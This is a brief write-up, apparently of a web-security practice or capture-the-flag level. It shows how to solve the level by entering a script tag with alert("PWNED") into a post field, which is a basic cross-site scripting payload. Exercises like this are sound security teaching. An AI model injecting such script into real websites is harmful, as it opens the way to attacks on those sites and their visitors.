This level is also pretty simple, it requires us to inject an `alert("PWNED")` command into the website. We have an input field that displays any of our post, so we can just input this:

```html
<script>alert("PWNED")</script>
```